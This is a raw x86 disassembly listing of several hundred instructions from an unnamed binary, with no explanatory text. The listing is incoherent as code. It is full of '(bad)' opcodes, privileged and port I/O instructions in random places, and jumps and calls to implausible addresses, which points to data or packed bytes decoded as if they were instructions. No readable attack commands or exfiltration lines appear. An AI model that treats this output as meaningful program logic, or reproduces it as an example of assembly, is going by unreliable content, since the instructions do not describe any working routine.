  413a22:	mov    edi,DWORD PTR [eax-0x4]
  413a25:	add    edi,DWORD PTR [edi]
  413a27:	or     bh,bh
  413a29:	push   ebp
  413a2a:	push   es
  413a2b:	mov    DWORD PTR [ebp-0x4],ebx
  413a2e:	add    edi,esi
  413a30:	pop    es
  413a31:	add    esi,DWORD PTR [edi-0x48ccf183]
  413a37:	mov    DWORD PTR [esp+esi*8],ecx
  413a3a:	inc    ebp
  413a3b:	pop    ebp
  413a3c:	xor    DWORD PTR [esi-0x4],0x3b
  413a40:	add    edx,DWORD PTR [ecx+edi*1]
  413a43:	push   es
  413a44:	clc    
  413a45:	mov    bh,0xdb
  413a47:	jp     0x413a00
  413a49:	add    cl,BYTE PTR [esi]
  413a4b:	div    DWORD PTR [edi+0x4d8b0c1c]
  413a51:	test   edi,edi
  413a53:	je     0x413a49
  413a55:	mov    eax,ecx
  413a57:	or     BYTE PTR [ebx],al
  413a59:	dec    BYTE PTR [ecx+0x7d3bec7d]
  413a5f:	jbe    0x413ad3
  413a61:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  413a67:	add    ecx,DWORD PTR [esi]
  413a69:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  413a6f:	add    eax,DWORD PTR [ebx-0x287af783]
  413a75:	je     0x413ac4
  413a77:	mov    DWORD PTR [ecx],edi
  413a79:	mov    esi,eax
  413a7b:	hlt    
  413a7c:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  413a83:	jb     0x413a45
  413a85:	jmp    0x413a72
  413a87:	xor    esi,DWORD PTR [ebx]
  413a89:	pop    edi
  413a8a:	pop    esi
  413a8b:	pop    ebx
  413a8c:	ret    
  413a8d:	ret    0x8b
  413a90:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  413a96:	xor    DWORD PTR [ecx],0xc
  413a99:	pushf  
  413a9a:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  413aa0:	wrmsr  
  413aa2:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  413aa9:	dec    ebp
  413aaa:	ret    
  413aab:	mov    edi,DWORD PTR [esi-0x4]
  413aae:	pop    eax
  413aaf:	dec    ebp
  413ab0:	jne    0x413a3d
  413ab2:	xor    edi,esp
  413ab4:	inc    eax
  413ab5:	dec    ebp
  413ab6:	jbe    0x413b0b
  413ab8:	inc    eax
  413ab9:	pop    ebp
  413aba:	add    edx,DWORD PTR [esi+0x8]
  413abd:	push   ebp
  413abe:	dec    eax
  413abf:	push   ecx
  413ac0:	mov    eax,edi
  413ac2:	and    al,0xf0
  413ac4:	jo     0x413ab1
  413ac6:	mov    eax,DWORD PTR [ebx]
  413ac8:	sbb    BYTE PTR [ebp+0x4d],cl
  413acb:	mov    eax,DWORD PTR [ebx]
  413acd:	nop
  413ace:	or     BYTE PTR [eax],al
  413ad0:	jne    0x413b29
  413ad2:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  413ad9:	xor    edi,edi
  413adb:	add    edi,DWORD PTR [ebp+0x3]
  413ade:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  413ae4:	js     0x413a6a
  413ae6:	jae    0x413aea
  413ae8:	(bad)  
  413aea:	xor    al,0x5d
  413aec:	jmp    0x413a79
  413aee:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  413af5:	fdecstp 
  413af7:	test   BYTE PTR [edi],ah
  413af9:	add    bh,BYTE PTR [ebp+0x0]
  413afc:	add    ebx,DWORD PTR [ebp-0x77]
  413aff:	mov    edi,eax
  413b01:	cmp    al,0x0
  413b04:	adc    dh,BYTE PTR [ebx]
  413b06:	jge    0x413b0b
  413b08:	mov    edi,DWORD PTR [ebx]
  413b0a:	jl     0x413b1b
  413b0c:	clc    
  413b0d:	dec    edi
  413b0e:	jge    0x413b10
  413b10:	mov    eax,DWORD PTR [ebx]
  413b12:	jb     0x413b1c
  413b14:	mov    ecx,DWORD PTR [ebp-0x8]
  413b17:	mov    edi,edi
  413b19:	xor    edx,DWORD PTR [eax]
  413b1b:	add    edi,DWORD PTR [ebx]
  413b1d:	mov    DWORD PTR [ebp-0x10],edi
  413b20:	inc    edi
  413b21:	pop    ebp
  413b22:	jge    0x413b5f
  413b24:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  413b28:	mov    edx,0xc05d87f0
  413b2d:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  413b31:	fimul  WORD PTR [eax]
  413b33:	fist   WORD PTR [ebp+0x1c]
  413b36:	in     al,dx
  413b37:	jne    0x413b25
  413b39:	mov    edi,DWORD PTR [edx-0x7a27a10]
  413b3f:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  413b43:	fdivp  st(0),st
  413b45:	fild   WORD PTR [ebp+0x4510f85c]
  413b4b:	test   BYTE PTR [ebx+0x4d00fc02],cl
  413b51:	inc    ebp
  413b52:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  413b58:	mov    ebp,DWORD PTR [ebx-0x4]
  413b5b:	adc    al,0x8b
  413b5d:	rcl    DWORD PTR [eax],0x48
  413b60:	mov    esi,0x7080803
  413b65:	fiadd  WORD PTR [ebp+0x4d]
  413b68:	(bad)  
  413b69:	mov    edx,DWORD PTR [edx-0x4]
  413b6c:	mov    edx,DWORD PTR [ebp-0x4]
  413b6f:	xor    ebx,DWORD PTR [ebx+0x330103]
  413b75:	mov    DWORD PTR [edi+0x872dc],edi
  413b7b:	xlat   BYTE PTR ds:[ebx]
  413b7c:	into   
  413b7d:	ffreep st(6)
  413b7f:	retf   0x6c7
  413b82:	iret   
  413b83:	dec    ebp
  413b84:	inc    ebp
  413b85:	mov    DWORD PTR [ebx],edi
  413b87:	fmul   QWORD PTR [edi]
  413b89:	dec    ebp
  413b8a:	jnp    0x413bbf
  413b8c:	add    BYTE PTR [ebx],al
  413b8e:	mov    ecx,DWORD PTR [esp+edi*8]
  413b91:	inc    ebp
  413b92:	dec    ebp
  413b93:	lea    esi,[ebx]
  413b95:	add    DWORD PTR [ebx],eax
  413b97:	jb     0x413bd4
  413b99:	add    BYTE PTR [edi],cl
  413b9b:	inc    ebp
  413b9c:	imul   eax,edi,0x858bd800
  413ba2:	cld    
  413ba3:	clc    
  413ba4:	mov    DWORD PTR [ebp+0x0],eax
  413ba7:	inc    DWORD PTR [eax]
  413ba9:	or     al,0xde
  413bab:	sbb    bh,0x1
  413bae:	retf   
  413baf:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  413bb6:	dec    ebp
  413bb7:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  413bbd:	enter  0x12de,0xdf
  413bc1:	inc    ebp
  413bc2:	pop    ebp
  413bc3:	dec    DWORD PTR [ebx-0x257f0ff4]
  413bc9:	add    DWORD PTR [edx],edx
  413bcb:	add    BYTE PTR [ebp+0x50],dl
  413bce:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  413bd4:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  413bda:	or     ah,al
  413bdc:	pop    ss
  413bdd:	cdq    
  413bde:	push   ebp
  413bdf:	clc    
  413be0:	mov    eax,DWORD PTR [ebp-0x4]
  413be3:	xor    edx,edx
  413be5:	add    esi,DWORD PTR [ebx]
  413be7:	cmp    eax,DWORD PTR [ebx]
  413be9:	hlt    
  413bea:	cmp    DWORD PTR [ebx],esp
  413bec:	or     al,BYTE PTR [ebp+0xf]
  413bef:	mov    eax,DWORD PTR [edx]
  413bf1:	loopne 0x413bf3
  413bf3:	(bad)  
  413bf4:	mov    ecx,esi
  413bf6:	cld    
  413bf7:	pushf  
  413bf8:	pop    ebp
  413bf9:	pushf  
  413bfa:	mov    esi,DWORD PTR [edx]
  413bfc:	lock mov eax,eax
  413bff:	adc    BYTE PTR [ebx],al
  413c01:	or     BYTE PTR [ebx+0x4d001001],0xcf
  413c08:	xor    ebp,DWORD PTR [edi+0x50e45189]
  413c0e:	dec    ebp
  413c0f:	mov    ecx,DWORD PTR [ebx-0x31390304]
  413c15:	(bad)  
  413c16:	iret   
  413c17:	inc    ebp
  413c18:	(bad)  
  413c19:	jne    0x413c68
  413c1b:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  413c21:	(bad)  
  413c22:	cmp    ebx,eax
  413c24:	je     0x413bac
  413c26:	add    edi,edi
  413c28:	or     bh,bh
  413c2a:	dec    ebp
  413c2b:	inc    ebp
  413c2c:	mov    esi,DWORD PTR [ebx]
  413c2e:	cld    
  413c2f:	add    ecx,esi
  413c31:	cmp    ecx,DWORD PTR [eax-0xc]
  413c34:	mov    edx,DWORD PTR [edi]
  413c36:	or     BYTE PTR [ebp-0x7c],al
  413c39:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  413c40:	or     al,0x9c
  413c42:	inc    ebp
  413c43:	xor    bh,BYTE PTR [ecx+ecx*4]
  413c46:	pushf  
  413c47:	call   0x522bd7
  413c4c:	jne    0x413c15
  413c4e:	mov    ebp,esp
  413c50:	fcomp  DWORD PTR [ebx]
  413c52:	add    BYTE PTR [ecx],al
  413c54:	inc    DWORD PTR [ebp-0x75]
  413c57:	(bad)  
  413c58:	cld    
  413c59:	add    al,0xce
  413c5b:	mov    ecx,edi
  413c5d:	cld    
  413c5e:	inc    ebp
  413c5f:	fidivr WORD PTR [ebx]
  413c61:	fbstp  TBYTE PTR [ebp-0x3e]
  413c64:	mov    eax,DWORD PTR [eax]
  413c66:	adc    BYTE PTR [ebx-0x3974038b],cl
  413c6c:	fadd   st,st(7)
  413c6e:	add    BYTE PTR [ebp-0x1],al
  413c71:	mov    ecx,DWORD PTR [esp+edi*8]
  413c74:	inc    ebp
  413c75:	mov    bh,0xc7
  413c78:	loopne 0x413cbf
  413c7a:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  413c80:	sbb    BYTE PTR [ebx],dh
  413c82:	pushf  
  413c83:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  413c89:	mov    eax,edi
  413c8b:	cwde   
  413c8c:	inc    ebp
  413c8d:	inc    ebp
  413c8e:	jne    0x413c1b
  413c90:	mov    esp,esp
  413c92:	clc    
  413c93:	add    al,0x4d
  413c95:	mov    DWORD PTR [ebx],esi
  413c97:	or     al,0x33
  413c99:	inc    ebp
  413c9a:	lea    ecx,[ebx-0x398d13fd]
  413ca0:	add    bh,al
  413ca2:	inc    ebp
  413ca3:	ror    DWORD PTR [ebx+0x45d829],0x8b
  413caa:	add    ebp,esp
  413cac:	shufps xmm1,xmm3,0xc7
  413cb0:	(bad)  
  413cb1:	jmp    0x748677da
  413cb6:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  413cbc:	hlt    
  413cbd:	mov    ecx,DWORD PTR [edi]
  413cbf:	fadd   DWORD PTR [ebp+0x0]
  413cc2:	xor    ecx,DWORD PTR [edi]
  413cc4:	add    ecx,ecx
  413cc6:	cmp    edi,edi
  413cc8:	pmuludq mm7,QWORD PTR [edx+0x50]
  413ccc:	(bad)  
  413ccd:	jmp    0x413c5a
  413ccf:	mov    edi,esp
  413cd1:	or     al,0xc6
  413cd3:	inc    ebp
  413cd4:	(bad)  
  413cd5:	mov    eax,DWORD PTR [ebp+0x10]
  413cd8:	jne    0x413c63
  413cda:	mov    eax,DWORD PTR [ecx]
  413cdc:	clc    
  413cdd:	add    BYTE PTR [ebp-0x40],cl
  413ce0:	xor    edx,DWORD PTR [eax-0x73]
  413ce3:	jne    0x413ce6
  413ce5:	push   DWORD PTR [edx+0x8]
  413ce8:	add    BYTE PTR [ebp+0x45],al
  413ceb:	mov    ebp,ecx
  413ced:	cld    
  413cee:	add    BYTE PTR [ebp+0x0],cl
  413cf1:	xor    eax,DWORD PTR [ebp+0x3]
  413cf4:	mov    DWORD PTR [ebx],edi
  413cf6:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  413cfc:	sub    eax,0x5d330e4d
  413d01:	lea    esi,[ebx]
  413d03:	add    DWORD PTR [ebx],eax
  413d05:	jb     0x413cf0
  413d07:	add    BYTE PTR [eax],al
  413d09:	inc    ebp
  413d0a:	add    bl,ch
  413d0c:	inc    ebp
  413d0d:	mov    esi,DWORD PTR [ebx]
  413d0f:	or     al,0x3
  413d11:	(bad)  
  413d12:	mov    edi,eax
  413d14:	in     al,dx
  413d15:	scas   eax,DWORD PTR es:[edi]
  413d16:	inc    ebp
  413d17:	mov    esi,DWORD PTR [ebx]
  413d19:	in     al,0x3
  413d1b:	add    al,0x89
  413d1d:	mov    ecx,DWORD PTR [eax+edi*8]
  413d20:	dec    ebp
  413d21:	(bad)  
  413d22:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  413d29:	mov    ecx,eax
  413d2b:	cld    
  413d2c:	push   es
  413d2d:	dec    ebp
  413d2e:	add    al,0x33
  413d30:	mov    DWORD PTR [ebx],eax
  413d32:	in     al,dx
  413d33:	cmp    DWORD PTR [ebp-0x67],eax
  413d36:	mov    eax,DWORD PTR [ebp-0xba0068]
  413d3c:	mov    edx,DWORD PTR [ebp-0x4]
  413d3f:	mov    ecx,DWORD PTR [ebp-0x18]
  413d42:	xor    ecx,DWORD PTR [ebp+0x3]
  413d45:	cmp    DWORD PTR [ebx],0x8b32749b
  413d4b:	xor    edi,esp
  413d4d:	jmp    0xff753a9f
  413d52:	add    ecx,DWORD PTR [ebp-0x3f]
  413d55:	xor    ebx,DWORD PTR [edi]
  413d57:	add    eax,ecx
  413d59:	cmp    ebx,DWORD PTR [eax]
  413d5b:	mov    ecx,DWORD PTR [ebp-0x4]
  413d5e:	mov    ecx,DWORD PTR [eax]
  413d60:	adc    BYTE PTR [ebp-0x80],al
  413d63:	jmp    0x413d66
  413d65:	mov    eax,DWORD PTR [eax]
  413d67:	cld    
  413d68:	mov    bh,0xc6
  413d6a:	push   ecx
  413d6b:	(bad)  
  413d6c:	jne    0x413dcc
  413d6e:	dec    ecx
  413d70:	or     BYTE PTR [ecx+ebx*1],cl
  413d73:	push   ebp
  413d74:	inc    ebp
  413d75:	in     al,dx
  413d76:	add    ebp,esp
  413d78:	or     bh,al
  413d7a:	dec    ebp
  413d7b:	cld    
  413d7c:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  413d82:	xor    DWORD PTR [eax],0x2
  413d85:	pushf  
  413d86:	dec    DWORD PTR [ebx+0x45510cf4]
  413d8c:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  413d92:	mov    edx,DWORD PTR [ecx+0xc]
  413d95:	xor    eax,esi
  413d97:	mov    edx,0xc172c7
  413d9c:	inc    ebp
  413d9d:	mov    esi,DWORD PTR [ebp+0x8]
  413da0:	mov    eax,edx
  413da2:	call   0x84c60497
  413da7:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  413dae:	call   0x4db14dbb
  413db3:	push   edi
  413db4:	xor    esi,DWORD PTR [ebp+0x3]
  413db7:	(bad)  
  413db8:	pmulhuw mm0,mm1
  413dbb:	test   DWORD PTR [ebp-0x8],ecx
  413dbe:	mov    DWORD PTR [ebp-0x67],eax
  413dc1:	mov    eax,DWORD PTR [ebp-0x4]
  413dc4:	xor    edi,DWORD PTR [ebp-0x73]
  413dc7:	xor    eax,DWORD PTR [ebx]
  413dc9:	xor    esi,DWORD PTR [edx+0x3]
  413dcc:	add    BYTE PTR [ecx],bh
  413dce:	inc    ebp
  413dcf:	(bad)  
  413dd0:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  413dd6:	mov    DWORD PTR [eax],0x750f0004
  413ddc:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  413de2:	lock add BYTE PTR [ebp+0x0],al
  413de6:	mov    esi,DWORD PTR [ebp-0x2c]
  413de9:	mov    ebp,edx
  413deb:	or     al,0x72
  413ded:	ja     0x413def
  413def:	mov    edx,esi
  413df1:	cld    
  413df2:	(bad)  
  413df5:	cli    
  413df6:	mov    esi,DWORD PTR [ebp-0x4]
  413df9:	cmp    ecx,esi
  413dfb:	bswap  edi
  413dfd:	(bad)
  413e01:	mov    esi,DWORD PTR [ebp-0x4]
  413e04:	mov    esi,ecx
  413e06:	clc    
  413e07:	repnz add esi,DWORD PTR [ebp+0x45]
  413e0b:	push   ebx
  413e0c:	xor    eax,DWORD PTR [ebp+0x3]
  413e0f:	xor    bl,BYTE PTR [edi-0x64]
  413e12:	pop    ebx
  413e13:	jmp    0x413eda
  413e18:	mov    esi,DWORD PTR [ebp-0x7d]
  413e1b:	xor    ebp,DWORD PTR [eax]
  413e1d:	lea    eax,[ebp-0x8]
  413e20:	xor    edx,esi
  413e22:	pushf  
  413e23:	out    dx,eax
  413e24:	(bad)  
  413e25:	neg    eax
  413e27:	ins    DWORD PTR es:[edi],dx
  413e28:	test   esi,edi
  413e2a:	clc    
  413e2b:	pop    esp
  413e2c:	inc    ebp
  413e2d:	or     BYTE PTR [ecx+0x450f0c7d],cl
  413e33:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  413e39:	add    cl,al
  413e3b:	jne    0x413dd9
  413e3d:	mov    esi,DWORD PTR [edx]
  413e3f:	in     al,dx
  413e40:	push   esi
  413e41:	xor    BYTE PTR [ebp-0xe],dh
  413e44:	add    edi,esi
  413e46:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  413e4c:	add    cl,bh
  413e4e:	mov    edi,DWORD PTR [ebp+0x8]
  413e51:	mov    DWORD PTR [ebp-0x14],esi
  413e54:	add    esi,DWORD PTR [ebp+0x3c]
  413e57:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  413e5d:	mov    ah,0x3c
  413e5f:	pushf  
  413e60:	pushf  
  413e61:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  413e67:	jne    0x413df4
  413e69:	mov    ecx,DWORD PTR [esp+ebp*8]
  413e6c:	icebp  
  413e6d:	icebp  
  413e6e:	shl    edx,0xf2
  413e71:	(bad)  
  413e72:	mov    ah,0x16
  413e74:	pop    eax
  413e75:	jne    0x413e0a
  413e77:	mov    ecx,DWORD PTR [edi]
  413e79:	in     al,dx
  413e7a:	jmp    0x413e6d
  413e7c:	add    dl,dh
  413e7e:	mov    edi,esi
  413e80:	or     al,0x8
  413e82:	inc    ebp
  413e83:	jne    0x413e88
  413e85:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  413e8b:	ret    
  413e8c:	or     bh,bh
  413e8e:	jge    0x413e78
  413e90:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  413e96:	xor    edi,eax
  413e98:	add    esi,DWORD PTR [ebp-0x77]
  413e9b:	mov    ebx,esp
  413e9d:	clc    
  413e9e:	neg    DWORD PTR [ebp-0x7c]
  413ea1:	xor    eax,DWORD PTR [eax]
  413ea3:	cmp    eax,DWORD PTR [eax]
  413ea5:	repz jne 0x413e3d
  413ea8:	xor    eax,DWORD PTR [ecx]
  413eaa:	add    ebx,DWORD PTR [eax]
  413eac:	mov    DWORD PTR [ebp-0x8],eax
  413eaf:	mov    eax,edi
  413eb1:	cld    
  413eb2:	lock pop eax
  413eb4:	test   DWORD PTR [ebx],esi
  413eb6:	clc    
  413eb7:	add    edx,DWORD PTR [edi-0x740bff77]
  413ebd:	fdivp  st(4),st
  413ebf:	test   ecx,esi
  413ec1:	(bad)  
  413ec2:	jnp    0x413ec3
  413ec4:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  413eca:	jae    0x413e57
  413ecc:	sub    edi,esp
  413ece:	(bad)  
  413ecf:	shl    DWORD PTR [eax-0x3e],0x89
  413ed3:	leave  
  413ed4:	call   0x8196f5e1
  413ed9:	in     al,dx
  413eda:	(bad)  
  413edb:	in     al,dx
  413edc:	add    bh,al
  413ede:	mov    esp,edi
  413ee0:	in     al,dx
  413ee1:	test   DWORD PTR [ebp-0x8],edi
  413ee4:	mov    eax,DWORD PTR [ebp+0x2b]
  413ee7:	xor    BYTE PTR [ebx],al
  413ee9:	pushf  
  413eea:	jnp    0x57303b23
  413ef0:	xor    edx,DWORD PTR [ebp-0x77]
  413ef3:	push   ecx
  413ef4:	loopne 0x413f29
  413ef6:	jne    0x413eb3
  413ef8:	mov    esi,DWORD PTR [edx-0x20]
  413efb:	add    BYTE PTR [ebp-0x3d],bh
  413efe:	xor    eax,DWORD PTR [ebp-0x73]
  413f01:	mov    edi,DWORD PTR [esi]
  413f03:	cld    
  413f04:	jb     0x413ecc
  413f06:	add    bl,al
  413f08:	jne    0x413f4f
  413f0a:	mov    edx,DWORD PTR [edi-0x10]
  413f0d:	jge    0x413f8c
  413f0f:	mov    esi,DWORD PTR [ebx]
  413f11:	lock add ecx,DWORD PTR [ebp+0x3b]
  413f15:	xor    esi,DWORD PTR [ebp-0x77]
  413f18:	mov    esi,eax
  413f1a:	lock inc ebp
  413f1c:	jge    0x413f4f
  413f1e:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  413f25:	dec    ebp
  413f26:	mov    esi,DWORD PTR [ebx]
  413f28:	loopne 0x413eb3
  413f2a:	jge    0x413f24
  413f2c:	add    DWORD PTR [ebp-0x7d],eax
  413f2f:	icebp  
  413f30:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  413f37:	dec    ebp
  413f38:	hlt    
  413f39:	xor    ebx,DWORD PTR [ebp-0x77]
  413f3c:	mov    esi,esp
  413f3e:	in     al,0x45
  413f40:	jge    0x413f7f
  413f42:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  413f49:	dec    ebp
  413f4a:	pop    esp
  413f4b:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  413f51:	inc    ebp
  413f52:	hlt    
  413f53:	xor    DWORD PTR [ebp-0x61],esi
  413f56:	mov    edi,DWORD PTR [eax+0xf19504]
  413f5c:	repnz mov DWORD PTR [ebp+0x20],ebx
  413f60:	cmp    eax,DWORD PTR [ebp+0xf]
  413f63:	test   DWORD PTR [edi+ecx*1-0x1],edx
  413f67:	fistp  WORD PTR [ebx+0x0]
  413f6a:	inc    ebp
  413f6b:	mov    ebx,DWORD PTR [edi+0xc]
  413f6e:	add    eax,eax
  413f70:	inc    ebp
  413f71:	test   BYTE PTR [ebx],dh
  413f73:	add    eax,DWORD PTR [ebx]
  413f75:	add    BYTE PTR [esi+0x45],bl
  413f78:	ret    0x85
  413f7b:	jnp    0x5441c34a
  413f81:	inc    bp
  413f83:	inc    ebp
  413f84:	xor    DWORD PTR [ecx+0xc78a9c],edi
  413f8a:	fdiv   QWORD PTR [ebx]
  413f8c:	test   DWORD PTR [ecx+0x453bf8],edi
  413f92:	push   ebx
  413f93:	add    edi,DWORD PTR [esi+0x708088b]
  413f99:	cmp    esi,eax
  413f9b:	setl   BYTE PTR [ecx-0x74fcffce]
  413fa2:	mov    esp,edi
  413fa4:	call   0x33cc84f6
  413fa9:	or     BYTE PTR [ebx],al
  413fab:	inc    ecx
  413fac:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  413fb2:	and    BYTE PTR [ebp-0x7074f0bb],al
  413fb8:	lock add cl,al
  413fbb:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  413fc2:	mov    ch,0x45
  413fc4:	clc    
  413fc5:	xor    eax,DWORD PTR [ebp+0x3]
  413fc8:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  413fce:	inc    ebp
  413fcf:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  413fd5:	mov    edi,eax
  413fd7:	mov    eax,DWORD PTR [ebp+0x3c]
  413fda:	mov    ecx,DWORD PTR [eax]
  413fdc:	hlt    
  413fdd:	inc    ebp
  413fde:	ror    DWORD PTR [ebx+0x818c45],0xf4
  413fe5:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  413feb:	push   ebp
  413fec:	mov    edi,DWORD PTR [ebx]
  413fee:	in     al,dx
  413fef:	jne    0x413fb2
  413ff1:	mov    eax,DWORD PTR [ebp-0x28]
  413ff4:	add    DWORD PTR [eax],0xe8058dec
  413ffa:	clc    
  413ffb:	mov    esi,DWORD PTR [edi-0x8]
  413ffe:	add    dh,dl
  414000:	rol    WORD PTR [ebp-0x1],cl
  414004:	mov    edx,DWORD PTR [eax+0x8]
  414007:	jne    0x413fc9
  414009:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  414010:	inc    ebp
  414011:	push   esp
  414012:	test   DWORD PTR [ecx+0xf],ecx
  414015:	sub    edx,esp
  414017:	add    eax,DWORD PTR [eax]
  414019:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  41401f:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  414026:	mov    eax,DWORD PTR [ecx]
  414028:	and    BYTE PTR [eax],al
  41402a:	adc    BYTE PTR ds:[eax],al
  41402d:	inc    ebp
  41402e:	inc    cx
  414031:	push   esp
  414032:	add    al,0x75
  414034:	add    BYTE PTR [edx+0x66],dl
  414037:	enter  0xc1,0x4d
  41403b:	mov    esp,DWORD PTR [esi+0x20]
  41403e:	add    DWORD PTR [ecx-0x7b],eax
  414041:	add    eax,DWORD PTR [ebx]
  414043:	str    WORD PTR [eax+0x45]
  414047:	lea    ecx,[ebx+0x45890801]
  41404d:	sbb    BYTE PTR [ebx],al
  41404f:	dec    ebp
  414050:	cmp    al,0xf
  414052:	inc    ebp
  414053:	push   eax
  414054:	mov    esi,DWORD PTR [ebx]
  414056:	push   eax
  414057:	add    eax,eax
  414059:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  414060:	inc    ebp
  414061:	add    BYTE PTR [ecx],dh
  414063:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  41406a:	(bad)  
  41406b:	mov    ebx,eax
  41406d:	loopne 0x4140b4
  41406f:	dec    ebp
  414070:	mov    ecx,DWORD PTR [edi]
  414072:	cld    
  414073:	push   eax
  414074:	xchg   DWORD PTR [ebx],esi
  414076:	add    DWORD PTR [ebx],ebp
  414078:	add    BYTE PTR [ebx],ch
  41407a:	or     BYTE PTR [ecx],bh
  41407c:	dec    ecx
  41407d:	loopne 0x414082
  41407f:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  414085:	push   ebp
  414086:	add    DWORD PTR [ebx+0x55100800],eax
  41408c:	dec    ebp
  41408d:	jmp    0x414018
  41408f:	mov    esp,DWORD PTR [eax]
  414091:	sbb    dl,dl
  414093:	inc    eax
  414094:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  41409a:	add    BYTE PTR [ebx+0x74528555],cl
  4140a0:	push   ebp
  4140a1:	div    DWORD PTR [ebx]
  4140a3:	and    eax,DWORD PTR [ebx]
  4140a5:	add    edx,DWORD PTR [edx-0x30]
  4140a8:	jno    0x414035
  4140aa:	inc    DWORD PTR [eax+eiz*1]
  4140ad:	inc    ebp
  4140ae:	push   eax
  4140af:	push   eax
  4140b0:	mov    esp,DWORD PTR [edi-0x74beff1c]
  4140b6:	mov    edi,esp
  4140b8:	push   eax
  4140b9:	inc    ebp
  4140ba:	enter  0x458b,0x8
  4140be:	push   ecx
  4140bf:	(bad)  
  4140c0:	call   0x10b4a98
  4140c5:	pop    ss
  4140c6:	push   ebp
  4140c7:	mov    ecx,DWORD PTR [ebx+0x489408]
  4140cd:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4140d3:	push   ecx
  4140d4:	jo     0x4140be
  4140d6:	inc    DWORD PTR [edi]
  4140d8:	or     BYTE PTR [eax],al
  4140da:	call   0xcc4824
  4140df:	fmul   QWORD PTR [ebp+0x55]
  4140e2:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4140e8:	mov    bh,0x8c
  4140ea:	adc    al,0x9c
  4140ec:	dec    esp
  4140ed:	xor    bl,BYTE PTR [eax]
  4140ef:	mov    ecx,DWORD PTR [ebp+0xc]
  4140f2:	mov    eax,DWORD PTR [ebp-0x4]
  4140f5:	mov    esi,DWORD PTR [edi-0x3148f924]
  4140fb:	push   es
  4140fc:	retf   
  4140fd:	mov    BYTE PTR [ebp-0x30],0x3b
  414101:	inc    ebp
  414102:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  414109:	retf   0x83fc
  41410c:	into   
  41410d:	dec    ebp
  41410e:	retf   
  41410f:	mov    ecx,DWORD PTR [ebp-0x74]
  414112:	mov    eax,DWORD PTR [eax]
  414114:	fdiv   QWORD PTR [ebx]
  414116:	mov    bh,0x3
  414118:	push   es
  414119:	mov    esi,ecx
  41411b:	sbb    cl,dl
  41411d:	dec    ebp
  41411e:	sar    DWORD PTR [ebx],cl
  414120:	push   ebp
  414121:	jne    0x414132
  414123:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  414129:	lea    ebx,[eax]
  41412b:	call   0xf4caccf2
  414130:	sbb    dh,dl
  414132:	add    edx,ebx
  414134:	push   ebp
  414135:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  41413b:	push   ecx
  41413c:	mov    DWORD PTR [eax-0x30],edx
  41413f:	test   DWORD PTR [edx],eax
  414141:	xadd   esp,esi
  414144:	pop    es
  414145:	add    cl,dl
  414147:	mov    eax,ecx
  414149:	or     al,0x45
  41414b:	(bad)  
  41414c:	push   eax
  41414d:	add    DWORD PTR [edx+0x0],eax
  414150:	add    ecx,DWORD PTR [ecx]
  414152:	and    dh,cl
  414154:	call   0xc54a24
  414159:	add    DWORD PTR [ebp+0x0],edx
  41415c:	mov    esp,DWORD PTR [ebp+0x18]
  41415f:	add    BYTE PTR [eax+0x54],cl
  414162:	xor    eax,DWORD PTR [eax]
  414164:	add    esp,DWORD PTR [esi+0x3b]
  414167:	inc    ebp
  414168:	je     0x4140ed
  41416a:	push   ecx
  41416b:	cli    
  41416c:	dec    ebp
  41416d:	mov    DWORD PTR [ebx],eax
  41416f:	(bad)  
  414170:	or     al,0x5e
  414172:	inc    eax
  414173:	add    BYTE PTR [ebx],al
  414175:	data16 and BYTE PTR [ebp+0x50],al
